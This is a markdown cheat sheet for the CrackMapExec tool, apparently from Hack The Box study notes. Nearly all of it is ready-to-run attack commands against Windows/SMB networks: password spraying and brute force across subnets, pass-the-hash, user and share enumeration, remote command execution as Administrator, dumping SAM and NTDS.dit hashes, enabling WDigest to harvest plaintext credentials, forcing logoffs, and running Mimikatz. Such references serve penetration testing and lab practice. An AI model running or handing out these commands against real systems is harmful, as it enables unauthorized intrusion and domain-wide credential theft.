# Crack Map Exec

## Installation

```bash
zombear@htb[/htb]$ sudo apt-get -y install crackmapexec
```

## Cheat Sheet

### General Command Format

```bash
zombear@htb[/htb]$ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

### Help

```bash

# General help
crackmapexec --help

# Protocol help
cracmapexec smb --help
```

### Connexions and Spraying

```bash
# Target format
crackmapexec smb ms.evilcorp.org
crackmapexec smb 192.168.1.0 192.168.0.2
crackmapexec smb 192.168.1.0-28 10.0.0.1-67
crackmapexec smb 192.168.1.0/24
crackmapexec smb targets.txt

# Null session
crackmapexec smb 192.168.10.1 -u "" up ""

# Connect to target using local account
crackmapexec smb 192.168.215.138 -u 'Administrator' -p 'PASSWORD' --local-auth

# Pass the hash against a subnet
crackmapexec smb 172.16.157.0/24 -u administrator -H 'LMHASH:NTHASH' --local-auth
crackmapexec smb 172.16.157.0/24 -u administrator -H 'NTHASH'

# Bruteforcing and Password Spraying
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1"
crackmapexec smb 192.168.100.0/24 -u "admin" -p "password1" "password2"
crackmapexec smb 192.168.100.0/24 -u "admin1" "admin2" -p "P@ssword"
crackmapexec smb 192.168.100.0/24 -u user_file.txt -p pass_file.txt
crackmapexec smb 192.168.100.0/24 -u user_file.txt -H ntlm_hashFile.txt

```

### Enumeration

```bash

#Users

# Enumerate users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --users

# Perform RID Bruteforce to get users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --rid-brute

# Enumerate domain groups
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --groups

# Enumerate local users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --local-users

#Hosts

# Generate a list of relayable hosts (SMB Signing disabled)
crackmapexec smb 192.168.1.0/24 --gen-relay-list output.txt

# Enumerate available shares
crackmapexec smb 192.168.215.138 -u 'user' -p 'PASSWORD' --local-auth --shares

# Get the active sessions
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --sessions

# Check logged in users
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --lusers

# Get the password policy
crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol

```

### Command Execution

```bash

# CrackMapExec has 3 different command execution methods (in default order) :
# - wmiexec --> WMI
# - atexec --> scheduled task
# - smbexec --> creating and running a service

# Execute command through cmd.exe (admin privileges required)
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x 'whoami'

# Force the smbexec method
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'net user Administrator /domain' --exec-method smbexec

# Execute commands through PowerShell (admin privileges required)
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X 'whoami'

```

### Get Creds

```bash

# Dump local SAM hashes
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --sam

# Enable or disable WDigest to get credentials from the LSA Memory
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest enable
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth --wdigest disable

# Then you juste have to wait the user logoff and logon again
# But you can force the logoff
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'quser'
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -x 'logoff <sessionid>'

# Dump the NTDS.dit from DC using methods from secretsdump.py

# Uses drsuapi RPC interface create a handle, trigger replication
# and combined with additional drsuapi calls to convert the resultant
# linked-lists into readable format
crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds

# Uses the Volume Shadow copy Service
crackmapexec smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss

# Dump the NTDS.dit password history
smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history

```

### Using the DB

```bash

# The database automatically store every hosts reaches by CME and all credentials with admin access
cmedb

# Using workspaces
cmedb> workspace create test
cmedb> workspace test

# Access a protocol database and switch back
cmedb (test)> proto smb
cmedb (test)> back

# List stored hosts
cmedb> hosts

# View detailed infos for a specific machine (including creds)
cmedb> hosts <hostname>

# Get stored credentials
cmedb> creds

# Get credentials access for a specific account
cmedb> creds <username>

# Using credentials from the database
crackmapexec smb 192.168.100.1 -id <credsID>
```

### Modules

```bash
# List available modules
crackmapexec smb -L

# Module information
crackmapexec smb -M mimikatz --module-info

# View module options
crackmapexec smb -M mimikatz --options

# Mimikatz module
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' --local-auth -M mimikatz
crackmapexec smb 192.168.215.104 -u 'Administrator' -p 'PASS' -M mimikatz
crackmapexec smb 192.168.215.104 -u Administrator -p 'P@ssw0rd' -M mimikatz -o COMMAND='privilege::debug'
```
